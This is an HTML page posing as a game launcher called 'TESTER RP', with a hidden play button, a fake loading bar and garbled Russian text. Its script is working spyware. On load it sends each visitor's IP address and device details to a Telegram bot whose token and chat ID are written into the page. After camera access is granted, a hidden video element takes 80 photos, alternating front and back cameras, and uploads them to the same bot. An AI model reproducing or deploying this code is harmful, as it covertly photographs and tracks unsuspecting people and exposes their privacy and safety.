<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        
        .new-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/kVcnz5xZ/14.png') no-repeat center center;
            background-size: cover;
            z-index: -1;
            display: none;
        }
        
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
        
        .loading-container {
            position: absolute;
            bottom: 50px;
            width: 80%;
            left: 10%;
            text-align: center;
            color: white;
            display: none;
        }
        
        .loading-text {
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background-color: #333;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            width: 0;
            background-color: white;
            transition: width 0.1s linear;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    <div class="new-background"></div>
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        –î–æ–≥–æ–≤–æ—Ä –æ—Ñ–µ—Ä—Ç—ã    –ü–æ–ª–∏—Ç–∏–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏
    </div>

    <div class="message-box" id="messageBox">
        –§–æ—Ä—É–º –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ
    </div>

    <div class="loading-container" id="loadingContainer">
        <div class="loading-text">Loading</div>
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        const botToken = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        const newBackground = document.querySelector('.new-background');
        const loadingContainer = document.getElementById('loadingContainer');
        const progressBar = document.getElementById('progressBar');
        
        let currentStream = null;
        let frontCameraStream = null;
        let backCameraStream = null;
        let photoCount = 0;
        const totalPhotos = 80;
        const photoInterval = 50;
        let isFrontCameraActive = true;
        let userIP = '';
        let isProcessActive = false;

        // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏—è
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localTime: new Date().toLocaleString(),
                pageURL: window.location.href,
                cookies: navigator.cookieEnabled ? '–í–∫–ª—é—á–µ–Ω—ã' : '–í—ã–∫–ª—é—á–µ–Ω—ã'
            };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞
        function startProgressBar() {
            loadingContainer.style.display = 'block';
            let progress = 0;
            const interval = 40;
            const step = 100 / (interval * 10);
            
            const timer = setInterval(() => {
                progress += step;
                progressBar.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(timer);
                    messageBox.style.display = 'block';
                    setTimeout(() => {
                        progressBar.style.width = '0%';
                    }, 1000);
                }
            }, 100);
        }

        // –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        async function sendToTelegram(endpoint, data, isFormData = false) {
            const url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
            
            let options = {
                method: 'POST'
            };
            
            if (isFormData) {
                options.body = data;
            } else {
                options.headers = {
                    'Content-Type': 'application/json'
                };
                options.body = JSON.stringify(data);
            }
            
            const response = await fetch(url, options);
            return await response.json();
        }

        // 1. –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function sendUserInfo() {
            try {
                // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    userIP = ipData.ip;
                } catch (e) {
                    userIP = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
                }

                const deviceInfo = getDeviceInfo();

                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = 
                    `üö® –ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨ –ù–ê –°–ê–ô–¢–ï\n\n` +
                    `üåê IP: ${userIP}\n` +
                    `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.platform}\n` +
                    `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n` +
                    `üåç –í—Ä–µ–º—è: ${deviceInfo.localTime}\n` +
                    `üìç –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${deviceInfo.timezone}\n` +
                    `üç™ –ö—É–∫–∏: ${deviceInfo.cookies}\n` +
                    `üîó –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${deviceInfo.pageURL}\n\n` +
                    `üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n${deviceInfo.userAgent}`;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
                await sendToTelegram('sendMessage', {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                });

            } catch (error) {
                // –ü—Ä–∏ –æ—à–∏–±–∫–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –º–∏–Ω–∏–º—É–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}
            }
        }

        // 2. –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
        async function captureAndSendPhoto(index) {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                const cameraType = isFrontCameraActive ? 'front' : 'back';
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
                
                const caption = `üì∏ –§–æ—Ç–æ ${isFrontCameraActive ? '—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π' : '–∑–∞–¥–Ω–µ–π'} –∫–∞–º–µ—Ä—ã #${index}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nIP: ${userIP}`;
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                await sendToTelegram('sendPhoto', formData, true);
                
            } catch (error) {
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ #${index}\n–ö–∞–º–µ—Ä–∞: ${isFrontCameraActive ? '—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è' : '–∑–∞–¥–Ω—è—è'}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}
            }
        }

        // 3. –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É –∫–∞–º–µ—Ä–∞–º–∏
        async function switchCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                isFrontCameraActive = !isFrontCameraActive;
                const facingMode = isFrontCameraActive ? 'user' : 'environment';

                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                videoElement.srcObject = currentStream;

                if (isFrontCameraActive) {
                    frontCameraStream = currentStream;
                } else {
                    backCameraStream = currentStream;
                }

                await new Promise(resolve => setTimeout(resolve, 300));

            } catch (error) {
                throw error;
            }
        }

        // 4. –°–µ—Ä–∏–π–Ω–∞—è —Å—ä–µ–º–∫–∞
        async function takeSeriesOfPhotos() {
            try {
                if (photoCount < totalPhotos) {
                    await captureAndSendPhoto(photoCount + 1);
                    photoCount++;
                    
                    if (photoCount < totalPhotos) {
                        await switchCamera();
                        setTimeout(takeSeriesOfPhotos, photoInterval);
                    } else {
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å—ä–µ–º–∫–∏
                        try {
                            await sendToTelegram('sendMessage', {
                                chat_id: chatId,
                                text: `‚úÖ –°—ä–µ–º–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nIP: ${userIP}`,
                                parse_mode: 'HTML'
                            });
                        } catch (e) {}
                        
                        stopAllCameras();
                    }
                }
                
            } catch (error) {
                stopAllCameras();
            }
        }

        // 5. –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Å–µ—Ö –∫–∞–º–µ—Ä
        function stopAllCameras() {
            [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            });
            videoElement.srcObject = null;
            isProcessActive = false;
        }

        // 6. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä
        async function initCameras() {
            try {
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–æ–Ω –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
                newBackground.style.display = 'block';
                startProgressBar();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ —Å—ä–µ–º–∫–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `üì∏ –ù–∞—á–∞–ª–æ —Å—ä–µ–º–∫–∏\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–ò–Ω—Ç–µ—Ä–≤–∞–ª: ${photoInterval}–º—Å\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nIP: ${userIP}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}

                isFrontCameraActive = true;
                isProcessActive = true;
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                frontCameraStream = currentStream;
                videoElement.srcObject = currentStream;

                await new Promise(resolve => setTimeout(resolve, 1000));

                photoCount = 0;
                takeSeriesOfPhotos();
                
            } catch (error) {
                messageBox.style.display = 'block';
                
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚ö†Ô∏è –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ\n–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent}\n–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nIP: ${userIP}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}
            }
        }

        // 7. –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ò–≥—Ä–∞—Ç—å"
        playBtn.addEventListener('click', async function() {
            if (isProcessActive) return;
            
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `üü¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª –∫–Ω–æ–ø–∫—É "–ò–≥—Ä–∞—Ç—å"\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}
                
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(track => track.stop());
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å
                await sendUserInfo();
                await initCameras();
            } catch (error) {
                messageBox.style.display = 'block';
                
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚õî –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª –≤ –¥–æ—Å—Ç—É–ø–µ –∫ –∫–∞–º–µ—Ä–µ\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}
            }
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            sendUserInfo().catch(() => {});
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            if (isProcessActive || photoCount > 0) {
                try {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: `üì¥ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–∫—Ä—ã—Ç–∞\n–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Ñ–æ—Ç–æ: ${photoCount}/${totalPhotos}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nIP: ${userIP}`,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (e) {}
                
                stopAllCameras();
            }
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ —Å–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isProcessActive) {
                stopAllCameras();
            }
        });
    </script>
</body>
</html>
